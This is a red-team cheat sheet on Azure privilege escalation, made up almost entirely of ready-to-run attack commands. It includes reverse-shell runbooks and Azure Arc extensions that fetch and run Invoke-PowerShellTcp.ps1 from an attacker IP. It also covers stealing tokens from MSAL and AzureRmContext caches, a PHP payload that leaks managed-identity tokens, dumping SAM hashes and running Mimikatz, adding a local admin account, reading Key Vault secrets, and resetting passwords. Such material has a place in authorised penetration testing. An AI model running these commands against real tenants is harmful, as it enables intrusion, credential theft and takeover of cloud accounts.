# Privilege escalation
* [Privesc enumeration](#Privesc-enumeration)
* [Automation account](#Automation-account)
* [Command execution on a VM](#Command-execution-on-a-VM)
* [Getting credentials](#Getting-credentials)
  * [Stealing tokens](#Stealing-tokens)
  * [Keyvault](#Keyvault)
  * [Mimikatz](#Mimikatz)
  * [Visual Studio Code](#Visual-Studio-Code)
  * [Publish settings in files](#Publish-settings-in-files)
  * [Storage explorers](#Storage-explorers)
  * [Web config and App config files](#Web-config-and-App-config-files)
  * [Internal repositories](#Internal-repositories)
  * [Command history](#Command-history)
* [Managed Identity](#Managed-Identity)
* [Reset password of other users](#Reset-password-of-other-users)
* [Add credentials to enterprise applications](#Add-credentials-to-enterprise-applications)
* [Deployments](#Deployments)
* [Storage account](#Storage-account)
* [Abusing dynamic groups](#Abusing-dynamic-groups)
* [Arm Templates History](#Arm-Templates-History)
* [Function apps continuous deployment](#Function-apps-continuous-deployment)
* [Break glass accounts](#Break-glass-accounts)
* [Azure Container Registry dump](#Azure-Container-Registry-dump)
* [Azure ARC](#Azure-ARC)

## Privesc enumeration
### When on a new machine
#### Get context of current user
```
az ad signed-in-user show
Get-AzContext
```

#### List all owned objects
```
az ad signed-in-user list-owned-objects

Get-AzureADUserOwnedObject -ObjectId <ID>
```

#### Get access token
Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
```
az account get-access-token
az account get-access-token --resource-type ms-graph 
```

### General
#### List all accessible resources
```
Get-AzResource
```

#### Check if it can read any deployment
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCEGROUP>
```

#### Check role assignments on ResourceID
```
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

#### Get the allowed actions on the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

#### Add a user to a group
- Required aad-graph token
```
Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
```

## Automation account
- Automation Account comes very handy in privilege escalation:
  - Run As account is by default contributor on the current subscription and possible to have contributor permissions on other subscriptions in the tenant.   
  - Often, clear-text privileges can be found in Runbooks. For example, a PowerShell runbook may have admin credentials for a VM to use PSRemoting. 
  - Access to connections, key vaults from a runbook. 
  - Ability to run commands on on-prem VMs if hybrid workers are in use.
  - Ability to run commands on VMs using DSC in configuration management.
  - A runbook often contains clear-text passwords for example psremoting!

#### Get information on automation accounts
```
az extension add --upgrade -n automation
az automation account list
```

### Get the tokens to use Az Powershell
```
az account get-access-token
az account get-access-token --resource-type aad-graph

$accesstoken = ''
$aadtoken = ''

Connect-AzAccount -AccessToken $accesstoken -GraphAccessToken $aadtoken -AccountId <ID>
```

#### Get the role assigned of the automation accounts
- Check for the Roledefinition
- Get the ID from az automation account list

```
Get-AzRoleAssignment -Scope <ID>
```

#### Check if a hybrid worker is in use by the automation account
```
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <NAME> -ResourceGroupName <NAME>
```

#### Import Powershell runbook
```
Import-AzAutomationRunbook -Name student38 -Path <PATH TO .ps1 FILE> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Type PowerShell -Force -Verbose
```

#### Contents off studentx.ps1 for reverse shell
```
IEX (New-Object Net.Webclient).downloadstring("http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1")

reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4444
```

#### Publish the automation runbook to the vm
```
Publish-AzAutomationRunbook -RunbookName <NAME FOR RUNBOOK> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
```

#### Start the runbook
```
Start-AzAutomationRunbook -RunbookName <NAME OF RUNBOOK> -RunOn <WORKERGROUP NAME> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
```

#### Extract credentials automation account
```
Import-Module Microburst.psm1
Get-AzurePasswords
```

## Command execution on a VM
- Vm access can be found after getting a new user or tokens and seeing that it has access to a vm

#### Connect with Az Powershell
```
$accesstoken = ''
Connect-AzAccount -AccessToken $accesstoken -AccountId <CLIENT ID OR EMAIL>
```

#### Get more information about the VM (networkprofile)
```
Get-AzVM -Name <VM NAME> -ResourceGroupName <RESOURCE GROUP NAME> | select -ExpandProperty NetworkProfile
```

#### Get the network interface
```
Get-AzNetworkInterface -Name <NETWORKINTERFACE>
```

#### Query ID of public ip adress to get the public ip
```
Get-AzPublicIpAddress -Name <ID OF PUBLIC IP ADRESSES IN IPCONFIGURATION>
```

#### Check role assignments on the VM
```
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

#### Check the allowed actions of the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

#### Run a command on the VM
```
Invoke-AzVMRunCommand -VMName <VM NAME> -ResourceGroupName <NAME> -CommandId 'RunPowerShellScript' -ScriptPath '<PATH TO .ps1 FILE>' -Verbose
```

#### Contents of adduser.ps1
```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
New-LocalUser -Name <USER> -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student38
```

#### Access the VM
```
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USER>', $Password)
$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

#### Check for credentials in powershell history (Try other ways to tho!)
```
cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Login on VM as managed idenity
```
az login –identity
```

#### List permissions of current subscription
- May have more permissions then the user
```
az role assignment list -–assignee ((az account list | ConvertFrom-Json).id)
```

#### If no AZ module can request token manually 
- Then use Azure REST APIs with the token
```
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
```

### Read password hashes from virtual machine
- Download the disk https://docs.microsoft.com/en-us/azure/virtual-machines/windows/download-vhd#generate-download-url

#### Check the disks
```
sudo fdisk –l
```

#### Mount the disk
```
sudo mkdir /media/mounted-drive
sudo mount /dev/sdc4 /media/mounted-drive/
```

#### Navigate to the windows snapshot
```
cd /media/mounted-drive/
ls
```

#### Copy system/SAM and dump hashes
```
cd /media/mounted-drive/Windows/System32/config/
cp SAM SYSTEM ~/
cd ~/
impacket-secretsdump -system SYSTEM -sam SAM LOCAL
```

### Execute commands
- Requires the "Virtual Machine Contributor" role
- Run as default by SYSTEM or root
- Commandid =  RunPowerShellScript or RunShellScript

```
Invoke-AzVMRunCommand -ResourceGroupName <resource group name> -VMName <VM name> -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

### Reset password from VM
- Can be done from Azure portal
- This may be a quick way to gain access and avoid PowerShell alerting
- Be careful though as scripts/services may be using the credential

## Getting credentials
#### Read AD credentials
- User attributes and sensitive information

```
unknown command atm
```

### Stealing tokens
#### Stealing tokens from az cli
- az cli stores access tokens in clear text in ```accessTokens.json``` in the directory ```C:\Users\<username>\.Azure```
- We can read tokens from the file, use them and request new ones too!
- azureProfile.json in the same directory contains information about subscriptions. 
- You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
- To clear the access tokens, always use az logout

#### Stealing tokens from az powershell
- Az PowerShell stores access tokens in clear text in ```TokenCache.dat``` in the directory ```C:\Users\<username>\.Azure```
- It also stores ServicePrincipalSecret in clear-text in AzureRmContext.jsonif a service principal secret is used to authenticate. 
- Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
- Users can save tokens using Save-AzContext, look out for them! Search for Save-AzContext in PowerShell console history!
- Always use Disconnect-AzAccount!!

#### Save the AzureRmContext.json
```
cp %USERPROFILE%\.Azure\AzureRmContext.json C:\temp\AzureRmContext.json
```

#### Get the authenticated token for the user
```
Add-Type -AssemblyName System.Security; [Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect((([Text.Encoding]::Default).GetBytes((Get-Content -raw "$env:userprofile\AppData\Local\.IdentityService\msal.cache"))), $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
```

#### Save the token into AzureRmContext.json
-  Open AzureRmContext.json file in a notepad and find the line near the end of the file title “CacheData”. It should be null.

#### Import the token
```
Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
```

#### or Save azcontext
```
Save-AzContext -Path C:\Temp\AzureAccessToken.json
```

#### Import the token
```
Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
```

### Requesting tokens once logged in
#### AZ powershell
- Supported tokens - AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, OperationalInsights, ResourceManager, Synapse
```
Get-AzAccessToken -ResourceTypeName AadGraph
```

#### Azure CLI
- Supported tokens - aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
```
az account get-access-token --resource-type ms-graph 
```

### Keyvault
#### Get keyvault access token
```
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

### Login to account with access tokens for keyvault
```
$accesstoken = ''
$keyvaulttoken = ``

Connect-AzAccount -AccessToken $accesstoken -AccountId <ID> -KeyVaultAccessToken $keyvaulttoken
```

#### List all keyvaults
```
Get-AzKeyVault
```

#### Get info about a specific keyvault
```
Get-AzKeyVault -VaultName <VAULT NAME>
```

#### List the saved creds from keyvault
```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -AsPlainText
```

#### Read creds from a keyvault
```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <NAME> -AsPlainText
```

#### Connect with the credentials found and enumerate further!
```
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)

Connect-AzAccount -Credential $creds
```

### Mimikatz
```
Invoke-Mimikayz -Dumpcreds
```

#### Dump service account passwords
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

### Visual Studio Code
- Azure Cloud Service Packages (.cspkg)
- Deployment files created by Visual Studio.
- Possible other Azure services integration (SQL, storage, etc.)
- Through cspkg zip files for creds/certs.
- Search Visual Studio Public Directory ```<cloud project directory>\bin\debug\publish```

### Publish settings in files
- Look for file ```.publishsettings```
- Can contain a Base64 encoded Management Certificate or cleartext credentials
- Save "ManagementCertificate" section into a new .pfx file
- Search the user's Downloads directory and VS projects.

### Storage explorers
- Windows Credential Manager stores these credentials.
- Azure Storage Explorer for example has a built-in “Developer Tools” function that you can use to set breakpoints while loading the credentials allowing you to view them while unencrypted.

### Web config and App config files
-  ```Web.config``` and ```app.config``` files might contain creds or access tokens.
- Look for management cert and extract to ```.pfx``` like publishsettings files
```
sudo find / -name web.config 2>/dev/null
Get-ChildItem -Path C:\ -Filter app.config -Recurse -ErrorAction SilentlyContinue -Force
```

### Internal repositories
- Find internal repos (scan for port 80, 443 or Query AD and look for subdomains or hostnames as git, code, repo, gitlab, bitbucket etc)
- Tools for finding secrets
  - Gitleaks https://github.com/zricethezav/gitleaks
  - Gitrob https://github.com/michenriksen/gitrob
  - Truffle hog https://github.com/dxa4481/truffleHog

### Command history
- Look through command history
- ```~/.bash_history`` or ```%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
```
sudo find / -name .bash_history 2>/dev/null
Get-ChildItem -Path C:\ -Filter *ConsoleHost_history.txt* -Recurse -ErrorAction SilentlyContinue -Force
cat <FILE> | select-string password
cat <FILE> | select-string secure

Get-Childitem -Path C:\* -Force -Include *transcript* -Recurse -ErrorAction SilentlyContinue
type C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
```

## Managed Identity
#### Check for managed identity
- print environment variables and check for IDENTITY_HEADER and IDENTITY_ENDPOINT 
```
env
```

#### Request access token for managed identity
```
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

#### Request access token for managed identity html file upload
```
<?php 

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

## Reset password of other users
- Reset password if user has "authentication administrator" role on a group or administrative unit.

```
$password = "<PASSWORD>" | ConvertTo-SecureString -AsPlainText –Force
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<ACCOUNT>"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose
```

## Add credentials to enterprise applications
#### Check if secrets (application passwords) can be added to all enterprise applications
```
. .\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

#### Use the secret to autheticate as service principal.
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

### Check what resources service principal can access
```
Get-AzResource
```

## Deployments
#### Check access to any resource group
```
Get-AzResourceGroup
```

### Check if managed identity can read any deployment from the resource group:
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCE GROUP NAME>
```

#### Save the deployment template
```
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME>
```

#### Find passwords in the template
- Or manually scan through it!
```
cat <PATH TO .json FILE> | Select-String password
```

## Storage account
#### Check accessible resources
```
Get-AzResource
```

#### Check if there is a container that is acccessible
```
Get-AzStorageContainer -Context (Get-AzStorageAccount -Name <NAME> -ResourceGroupName <RESOURCEGROUPNAME>).Context
```

#### Check using the "Storage Explorer" application! Might be possible then!

#### Check if you can access storage account keys
```
Get-AzStorageAccountKey -name <NAME OF STORAGE> -resourcegroupname <NAME>
```

### Access Storage Accounts AZ powershell
```
Get-AzResource
Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context
Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob
```

#### Connect to the storage account with "Storage Explorer" using the account name and account keys

## Abusing dynamic groups
- By default, any user can invite guests in Azure AD. If a dynamic group rule allows adding users based on the attributes that a guest user can modify, it will result in abuse of this feature. For example based on EMAIL ID and join as guest that matches that rule.
- Login to the portal and check the groups. Is there any dynamic group?
- Click on the dynamic group and select "Dynamic membership rules". Is it possible to invite a user that complies to the rule?
- Go to Users and select "New Guest User"
- Open the user's profile and click on "(manage)" under invitation accepted. Select YES on resend invite and copy the URL.
- Open the URL in a private browser and login and accept the permissions.
- Connect to the tenant with AzureAD
- Set the secondary email for the user (Get the objectID of the user from the portal where we made the guest)
```
import-module .\AzureADPreview.psd1
Get-AzureADMSGroup | Where-Object -Property GroupTypes -Match 'DynamicMembership' | fl *
```

```
Set-AzureADUser -ObjectId <ID> -OtherMails <EMAIL> -Verbose
```
- Check if the user is added to the dynamic group (Might take a bit)

## Arm Templates and Deployment History
- Any user with permissions `Microsoft.Resources/deployments/read` and `Microsoft.Resources/subscriptions/resourceGroups/read` can read the deployment history.
- Login to the azure portal
- Go to the deployments under settings and check the template for passwords or anything!
- Not sure if its possible by commands in any module!

## Function apps continuous deployment
- In case continuous deployment is used, a source code update triggers a deployment to Azure. 
- Following source code locations are supported
  - Azure Repos
  - GitHub
  - Bitbucket
- May be able to escalate privileges if we can own a continuous deployment and execute code on anything or add users!

## Break glass accounts
- Another PrivEsc target is Azure “Break Glass” administrative accounts
- Microsoft recommends not setting up MFA for them
- Two accounts are usually recommended to be set up
- If you can determine which ones are the break glass they can be good targets

## Azure Container Registry dump
- https://github.com/NetSPI/MicroBurst 
```
Get-AzPasswords
Get-AzACR
```

## Azure ARC
- https://github.com/0xJs/RedTeaming_CheatSheet/edit/main/cloud/azure/privilege-escalation.md
- All roles with “Microsoft.HybridCompute/machines/extensions/write” permission are able to install or update an Azure Arc Extension. Some of them are:
  - Owner
  - Contributor
  - Azure Connected Machine Resource Administrator
  - Hybrid Server Resource Administrator
  - Windows Admin Center Administrator Login

#### Check azure arc
- Login to azure Portal and check for connected machines in Azure Arc

#### Retrieve the local IP address of the server:
```
az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name ipconfig --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'ipconfig'}" --location "eastus"
```

#### Retrieve interactive shell on the machine
```
az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name RemoteCode --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'powershell -c iex(New-Object Net.Webclient).downloadstring(\'http://<IP>/Invoke-PowerShellTcp.ps1\')'}" --location "eastus"
```
